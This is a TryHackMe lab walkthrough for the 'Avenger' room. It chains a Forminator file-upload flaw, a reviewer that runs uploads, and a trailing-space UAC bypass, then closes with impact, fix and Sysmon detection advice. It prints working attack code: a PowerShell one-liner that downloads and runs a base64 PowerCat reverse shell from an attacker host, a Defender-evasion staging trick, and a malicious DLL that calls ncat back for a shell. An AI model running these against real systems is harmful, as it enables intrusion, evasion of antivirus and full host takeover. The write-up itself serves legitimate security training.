@@ -1,0 +1,259 @@
+---
+title: 'Avenger'
+description: "A walkthrough of TryHackMe's Avenger — Forminator 1.24.1 unrestricted file upload plus an auto-executing reviewer delivers an AV-evading PowerCat shell, followed by UAC bypass via trailing-space trusted-folder DLL hijacking for full system access."
+date: 2026-01-10
+platform: tryhackme
+room: 'Avenger'
+roomUrl: 'https://tryhackme.com/room/avenger'
+difficulty: medium
+tags:
+  - 'web'
+  - 'wordpress'
+  - 'cve'
+  - 'file-upload'
+  - 'rce'
+  - 'windows'
+  - 'uac-bypass'
+  - 'dll-hijacking'
+  - 'privesc'
+vulnClasses:
+  - 'unrestricted file upload'
+  - 'uac bypass'
+  - 'dll search-order hijacking'
+translation: done
+draft: false
+---
+
+_A walkthrough of TryHackMe's Avenger — a Forminator 1.24.1 WordPress plugin accepts unrestricted file uploads, a reviewer automatically executes uploaded submissions, we deliver an AV-evading PowerCat reverse shell, then bypass UAC via trailing-space trusted-folder DLL hijacking to fully compromise the Windows host._
+
+> The flags, attacker/target IP addresses, and real credentials are redacted. Avenger is an authorized training room on TryHackMe; everything here was performed against a legal practice target. Values shown as `<redacted>` are real on the box but withheld here.
+
+---
+
+### **TL;DR**
+
+<Callout type="tldr">
+
+Rustscan → Apache 2.4.56 / WordPress at `/gift` / Forminator 1.24.1 (CVE-2023-4596) → public exploit fails (uploads land but aren't reachable at the expected path) → form response says _"the team will carefully review every message"_ → HTML beacon confirms reviewer fetches uploaded content → upload a `.bat` that downloads a **base64-encoded PowerCat shell** from attacker HTTP server and executes it → **Windows Defender evaded** → reverse shell as `gift\hugo` → user flag `THM{<redacted>}` → `hugo` in Administrators group but **Medium Integrity** (UAC active) → compile malicious `Secur32.dll`, download `ncat.exe` → create `C:\Windows \System32\` (trailing-space directory — user-owned, trusted by auto-elevation check) → copy `computerdefaults.exe` into it → drop our DLL → run it → **auto-elevates, loads our DLL** → High Integrity shell → root flag at `C:\Users\Administrator\Desktop\root.txt` `THM{<redacted>}`.
+
+</Callout>
+
+### **The target**
+
+```text
+export IP=<target-ip>
+export ATTACKER_IP=<your-tun0-ip>
+```
+
+Avenger runs a Windows Server with XAMPP — Apache 2.4.56, PHP 8.0.28, MariaDB 10.4.28 — and a WordPress installation at `/gift`:
+
+```text
+http://$IP/          →  Apache directory index (open)
+http://$IP/gift/     →  WordPress, Forminator 1.24.1 contact form
+http://$IP/dashboard →  phpMyAdmin (403 from outside)
+```
+
+Port 5985 (WinRM), SMB (445), and MySQL (3306) are also open alongside a cluster of Windows RPC ports — a typical Windows/XAMPP profile.
+
+### **The vulnerability: CVE-2023-4596 + a reviewer that executes uploads**
+
+WPScan identifies **Forminator 1.24.1** on the `/gift` WordPress site:
+
+```text
+[+] forminator
+ | Version: 1.24.1 (100% confidence)
+ | [!] The version is out of date, the latest version is 1.49.2
+```
+
+Forminator ≤ 1.24.6 is affected by **CVE-2023-4596** — unauthenticated unrestricted file upload. However, the public exploit (EDB-51664) does not work here: files are accepted, but they do not appear at the expected `/wp-content/uploads/<year>/<month>/` path.
+
+The actual attack surface is revealed by the form's confirmation message:
+
+> _"The team will very carefully review every message."_
+
+<Callout type="insight">
+
+That line is not flavour text — it signals a behavioural attack primitive. If something (a human reviewer or an automated pipeline) opens every uploaded submission, then **any file upload is potential RCE**. CVE-2023-4596 removes server-side file-type enforcement; the reviewer that executes content turns that upload capability into blind remote code execution.
+
+</Callout>
+
+### **Step 1 — Confirm the reviewer with an HTML beacon**
+
+Before uploading a shell, verify the hypothesis: create a minimal HTML file referencing a resource on the attacker's HTTP server.
+
+```text
+<img src="http://$ATTACKER_IP:9000/land.jpg"/>
+```
+
+Start the HTTP server:
+
+```text
+python3 -m http.server 9000
+```
+
+Upload the `.html` file through the Forminator form. Within seconds, the server logs an inbound request:
+
+```text
+10.x.x.x - - [10/Jan/2026 18:45:26] "GET /land.jpg HTTP/1.1" 200 -
+```
+
+Confirmed — something on the target fetches resources from the attacker machine immediately after every submission is reviewed.
+
+### **Step 2 — Build an AV-evasion PowerCat reverse shell**
+
+Windows Defender is active on the target. The evasion strategy: encode a PowerCat payload in base64 and store it in a `.txt` file; a `.bat` launcher downloads and executes it. The batch file itself contains no PowerShell shellcode — only a download-and-run command — and the base64 blob is opaque to signature scanning.
+
+On the attacker machine, generate the encoded PowerCat payload:
+
+```text
+LPORT=49731
+pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $ATTACKER_IP -p $LPORT -e cmd.exe -ge" > shell-49731.txt
+```
+
+Create the batch launcher `exp.bat`:
+
+```text
+START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://$ATTACKER_IP:9000/shell-49731.txt');iex 'powershell -E $code'
+```
+
+Start the listener and HTTP server:
+
+```text
+nc -lvnp 49731
+python3 -m http.server 9000
+```
+
+### **Step 3 — Upload the batch file, catch the shell**
+
+Upload `exp.bat` via the `/gift` form. The reviewer opens it; PowerShell fetches the base64 blob from the attacker HTTP server and executes the PowerCat payload:
+
+```text
+10.x.x.x - - [10/Jan/2026 19:02:15] "GET /shell-49731.txt HTTP/1.1" 200 -
+```
+
+```text
+connect to [$ATTACKER_IP] from (UNKNOWN) [10.x.x.x] 49887
+Microsoft Windows [Version 10.0.17763.4499]
+
+C:\Windows\system32> whoami
+gift\hugo
+```
+
+The user flag is on `hugo`'s Desktop:
+
+```text
+C:\Users\hugo\Desktop> type user.txt
+THM{<redacted>}
+```
+
+### **Step 4 — Enumerate for privilege escalation**
+
+`whoami /all` shows `hugo` is in `BUILTIN\Administrators` — but every administrator group entry is marked **"Group used for deny only"**, which indicates **Medium Integrity** (UAC is blocking the token from being fully activated):
+
+```text
+BUILTIN\Administrators  S-1-5-32-544  Group used for deny only
+Mandatory Label\Medium Mandatory Level  S-1-16-8192
+```
+
+Confirm the UAC setting from the registry:
+
+```text
+REG QUERY HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+    ConsentPromptBehaviorAdmin  REG_DWORD  0x5
+```
+
+Value `5` means the system will prompt for consent before running non-Windows binaries at high integrity. We need a silent UAC bypass.
+
+### **Step 5 — UAC bypass via trailing-space trusted-folder DLL hijacking**
+
+`computerdefaults.exe` (`C:\Windows\System32\computerdefaults.exe`) is a Windows binary that **auto-elevates without a UAC prompt** and loads `Secur32.dll` from its working directory on startup.
+
+The trick: create `C:\Windows \System32\` — the **trailing space** after `Windows` makes this a user-owned directory you control entirely. Windows' auto-elevation path check strips trailing spaces before comparing, so it sees `C:\Windows\System32\` and considers the binary trusted. You have full write access to a path that passes the trust check.
+
+On the attacker machine, compile a malicious `Secur32.dll`:
+
+```text
+// custom.cpp
+#include <windows.h>
+
+void exec_custom() {
+    WinExec("c:\\users\\hugo\\Desktop\\ncat.exe -e cmd.exe $ATTACKER_IP 49732", 1);
+}
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
+    if (ul_reason_for_call == DLL_PROCESS_ATTACH) exec_custom();
+    return TRUE;
+}
+```
+
+```text
+x86_64-w64-mingw32-gcc -shared -o Secur32.dll custom.cpp
+```
+
+On the target, download `ncat.exe`, create the fake trusted path, and plant the DLL:
+
+```text
+curl http://$ATTACKER_IP:9000/ncat.exe -o C:\Users\hugo\Desktop\ncat.exe
+
+mkdir "C:\Windows \"
+mkdir "C:\Windows \System32\"
+copy "C:\Windows\System32\computerdefaults.exe" "C:\Windows \System32\computerdefaults.exe"
+curl http://$ATTACKER_IP:9000/Secur32.dll -o "C:\Windows \System32\Secur32.dll"
+```
+
+Start the second listener:
+
+```text
+nc -lvnp 49732
+```
+
+Trigger the bypass:
+
+```text
+"C:\Windows \System32\computerdefaults.exe"
+```
+
+The binary auto-elevates, loads our `Secur32.dll`, and `DllMain` fires — connecting back at High Integrity:
+
+```text
+connect to [$ATTACKER_IP] from (UNKNOWN) [10.x.x.x] 50099
+
+C:\Windows\system32> whoami
+gift\hugo
+
+C:\Users\Administrator\Desktop> type root.txt
+THM{<redacted>}
+```
+
+`hugo` is still `hugo` — UAC bypass does not switch user accounts. It elevates the integrity level to High, giving the Administrator group membership its full effect and unrestricted access to the system.
+
+### **Impact**
+
+<Callout type="critical">
+
+**High — CVSS 3.1 8.8** (`AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`). Full remote-to-root compromise in two stages:
+
+- **Unauthenticated file upload → RCE via reviewer**: Forminator 1.24.1 (CVE-2023-4596) removes server-side file-type validation. The on-box reviewer automatically executes uploaded submissions, converting the upload primitive into blind RCE — no authentication required.
+- **AV evasion confirmed**: base64 PowerCat staging evades Windows Defender at upload and execution time, illustrating that signature-based detection alone is insufficient against simple staging techniques.
+- **Full system compromise**: the trailing-space UAC bypass silently elevates `hugo` to High Integrity Administrator, granting unrestricted access to the entire Windows host including other users' data.
+
+</Callout>
+
+### **Recommended fix**
+
+<Callout type="fix">
+
+1. **Update Forminator to ≥ 1.29.0**: the patched release enforces server-side allow-list validation (extension and MIME type). If an immediate upgrade is not possible, disable file upload fields in all active Forminator forms as a temporary control.
+2. **Sandbox the reviewer process**: any workflow that automatically opens user-submitted content must run in an internet-isolated, low-privilege sandbox with no ability to make outbound network connections. Removing the "reviewer executes content" primitive breaks the entire chain regardless of the upload vulnerability.
+3. **Harden UAC**: set `ConsentPromptBehaviorAdmin = 2` (always prompt on secure desktop). Monitor for directories with trailing spaces created under `C:\` using Sysmon event ID 11 or EDR path-anomaly rules. Do not grant local Administrator group membership to application or service accounts.
+
+</Callout>
+
+### **Takeaways**
+
+- **Application messages are recon.** _"The team will carefully review every message"_ directly reveals the behavioural attack surface — a reviewer that executes user content. Read every piece of on-screen text before reaching for an exploit.
+- **The CVE route may not be the actual path.** EDB-51664 failed here because uploaded files were inaccessible at the expected path. The behavioural vector — the reviewer — was the real vulnerability, and it required no special CVE exploit at all.
+- **Staging beats signatures.** Splitting a reverse shell across a `.bat` launcher and a `.txt` base64 blob sidesteps Windows Defender's on-access scanning. Behavioral detection (PowerShell download-and-execute, anomalous outbound connections) would still flag this on a hardened host — the gap between signature and behavioral coverage is the real lesson.
+- **`C:\Windows \`** **is a classic UAC bypass primitive.** The trailing-space trick gives you a user-owned directory that passes the auto-elevation trust check. It pairs with any auto-elevating binary whose DLL search path includes its own directory.
+
+Avenger is a two-rung ladder: an unpatched plugin lets you upload anything, and a reviewer that executes what it receives turns that into RCE. Neither flaw alone is as dangerous as both together.
